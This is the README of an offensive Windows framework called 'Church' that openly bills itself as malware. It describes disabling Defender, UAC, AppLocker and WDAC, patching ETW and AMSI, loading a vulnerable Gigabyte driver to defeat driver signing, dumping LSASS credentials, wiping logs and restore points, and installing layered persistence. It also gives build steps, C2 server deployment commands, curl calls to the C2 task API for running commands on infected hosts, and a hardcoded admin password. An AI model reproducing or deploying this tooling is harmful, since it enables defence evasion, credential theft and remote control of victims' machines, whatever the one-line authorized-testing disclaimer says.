# Church - Weaponized Windows Security Bypass Framework


```
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                         CHURCH OF MALWARE                                 ║
    ║                  Enterprise Offensive Security Framework                  ║
    ║                         by ek0ms savi0r                                   ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
```

**Repository:** https://git.churchofmalware.org/ek0mssavi0r/CHURCH/

##  DISCLAIMER FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY

---

##  Overview

Church is an enterprise-grade Windows security bypass framework that implements multiple advanced techniques to disable or neutralize modern Windows security controls. The framework operates as a cohesive system executing in eight coordinated phases, providing complete offensive capabilities for authorized red team operations.

### Core Capabilities

- **Windows Defender Tamper Protection** via registry ownership takeover
- **Defender real-time protection, behavior monitoring, cloud protection, signature updates**
- **User Account Control (UAC)** via EnableLUA registry modification
- **AppLocker & Windows Defender Application Control (WDAC)** via service disable and policy deletion
- **Driver Signature Enforcement (DSE)** via vulnerable driver exploitation (gdrv.sys CVE-2018-19320)
- **Protected Process Light (PPL)** via SeTcbPrivilege elevation and NtSetInformationProcess
- **Security event logging** via MiniNt registry key
- **System restore points and telemetry domains** via hosts file modification
- **Security services** including Sense, SgrmBroker, WdBoot, WdFilter, WdNisDrv, SecurityHealthService, wscsvc, and 15+ others
- **LSASS credential dumping** with hidden file attributes and shadow copy creation
- **Process hollowing and token stealing** for privilege escalation
- **WMI event subscription** for stealthy persistence
- **IFEO and Silent Process Exit** for automatic payload execution

### Execution Phases

| Phase | Operation | Description |
|-------|-----------|-------------|
| 0 | Telemetry Bypass | ETW and AMSI in-memory patching |
| 1 | Core Protection | Tamper Protection, Defender, UAC, AppLocker, WDAC |
| 2 | Anti-Forensics | Exclusion addition, log disabling, restore point deletion, telemetry blocking |
| 3 | Persistence | Scheduled tasks (x2), WMI events (x2), Run key, BootExecute, Winlogon, IFEO (x2), SilentProcessExit, Service |
| 4 | Service Elimination | Stop and disable 18+ security services |
| 5 | Credential Access | LSASS dump with hidden attribute, VSS shadow copy |
| 6 | Kernel Bypass | gdrv.sys BYOVD, DSE disable |
| 7 | Process Protection | PPL elevation via SeTcbPrivilege |
| 8 | C2 Activation | AES-256 encrypted beacon with jitter, fallback servers |

---

##  System Requirements

### Target Environment
- Windows 10 or Windows 11 (any edition)
- Windows Server 2016/2019/2022
- Administrator access required
- Test system or authorized target only

### Build Environment
- Visual Studio 2019 or later with C compiler
- Windows SDK 10.0.18362.0 or later
- Windows 10/11 SDK or later

### Required External File
- `gdrv.sys` (Gigabyte driver, CVE-2018-19320) placed in same directory as the executable
- Download from: https://github.com/Barakat/CVE-2018-19320

---

##  Compilation Instructions

### From Visual Studio Developer Command Prompt

```cmd
cl /O2 /MT /Fe:church.exe church.c /link advapi32.lib user32.lib wbemuuid.lib ole32.lib crypt32.lib ntdll.lib bcrypt.lib ws2_32.lib winhttp.lib iphlpapi.lib shlwapi.lib shell32.lib
```

### Compilation Flags for Production

| Flag | Purpose |
|------|---------|
| `/O2` | Optimize for speed |
| `/MT` | Static linking (no runtime DLLs) |
| `/GS-` | Disable stack buffer security check (smaller binary) |
| `/GL` | Whole program optimization |
| `/Os` | Favor code size |

### Stripping Symbols (After Compilation)

```cmd
strip --strip-all church.exe
```

---

##  Configuration

Edit `church.c` to configure C2 server settings before compilation:

```c
// C2 Configuration
#define C2_BASE_INTERVAL_SECONDS 60      // Base beacon interval
#define C2_JITTER_MAX_SECONDS 120        // Random jitter added

// Obfuscated strings (XOR key 0xDD)
CHAR g_c2_server_obf[] = "\x78\x9D\x9D..."  // https://your-c2-server.com/beacon
CHAR g_aes_key_obf[] = "\xAB\xAA\xA8..."     // 32-byte AES-256 key
CHAR g_aes_iv_obf[] = "\xB1\xB8\xB7..."      // 16-byte AES IV
```

Replace the obfuscated strings with your own XOR-encrypted values using the provided key (0xDD). The C2 server expects matching AES keys.

---

##  C2 Server Deployment

### Full APT-Grade C2 Server

```bash
# Install dependencies
pip install flask flask-socketio cryptography werkzeug

# Generate SSL certificate (for HTTPS)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Run the C2 server
python church_c2_server.py --host 0.0.0.0 --port 443

# Or with HTTP for testing
python church_c2_server.py --host 0.0.0.0 --port 8080 --http
```

### C2 Server Features

| Feature | Description |
|---------|-------------|
| **AES-256-CBC Encryption** | All beacon traffic encrypted end-to-end |
| **SQLite Database** | Persistent storage of beacons, tasks, results, credentials |
| **WebSocket Real-time** | Live updates to web UI |
| **Web UI Dashboard** | Modern terminal-style command interface |
| **REST API** | Full programmatic control with JWT authentication |
| **Task Queue** | Command queuing with output capture |
| **Multi-session** | Handle hundreds of beacons simultaneously |
| **Audit Logging** | Complete action history with timestamps |
| **Beacon Management** | Track last seen, status, metadata, tags |
| **Command Presets** | Quick common commands library |
| **Stale Cleanup** | Auto-remove dead beacons after timeout |
| **Credential Harvesting** | Store and categorize stolen credentials |

### C2 API Endpoints

```bash
# List all beacons
curl -H "X-Auth-Token: <JWT_SECRET>" https://localhost/api/beacons

# Execute command on beacon
curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{"host": "beacon_id", "command": "whoami"}' \
  https://localhost/api/task

# Execute PowerShell command
curl -X POST -H "X-Auth-Token: <JWT_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{"host": "beacon_id", "command": "Get-Process", "powershell": true}' \
  https://localhost/api/task

# Get beacon details
curl -H "X-Auth-Token: <JWT_SECRET>" \
  https://localhost/api/beacon/<beacon_id>

# Get task history
curl -H "X-Auth-Token: <JWT_SECRET>" \
  https://localhost/api/tasks/<beacon_id>

# Get system statistics
curl -H "X-Auth-Token: <JWT_SECRET>" \
  https://localhost/api/stats
```

### Web UI Access

Navigate to `https://c2-server:443` and log in with:
- **Username:** `admin`
- **Password:** `CHURCHadmin2024!!`

---

##  Execution

Run the compiled executable as Administrator:

```cmd
church.exe
```

The tool auto-elevates if not already running with administrative privileges. The console provides real-time feedback on each phase:

```
[***] CHURCH OF MALWARE - FULL WEAPONIZED BYPASS [***]

=== PHASE 1: CORE PROTECTIONS ===
[+] Tamper Protection disabled
[+] WinDefend disabled
[+] Terminated MsMpEng.exe
[+] UAC disabled (reboot required)
[+] AppIDSvc disabled

=== PHASE 2: ANTI-FORENSICS ===
[+] Defender exclusions added
[+] Security logs disabled (MiniNt)
[+] System Restore disabled
[+] Telemetry blocked

=== PHASE 3: PERSISTENCE ===
[+] Scheduled task added
[+] IFEO persistence set
[+] BootExecute persistence added
[+] WMI persistence added

=== PHASE 4: SERVICE ELIMINATION ===
[+] Disabled Sense, SgrmBroker, WdBoot, WdFilter, WdNisDrv...

=== PHASE 5: CREDENTIAL ACCESS ===
[+] LSASS dumped to C:\lsass.dmp

=== PHASE 6: KERNEL BYPASS ===
[+] gdrv.sys loaded
[+] DSE disabled via gdrv

=== PHASE 7: PROCESS PROTECTION ===
[+] Process is now PPL

=== PHASE 8: C2 ACTIVATION ===
[+] C2 beacon active (interval: 60-180 sec)

[+] ALL PHASES COMPLETE
[!] REBOOT REQUIRED
```

After completion, the system reboots automatically.

---

x0 ek0ms
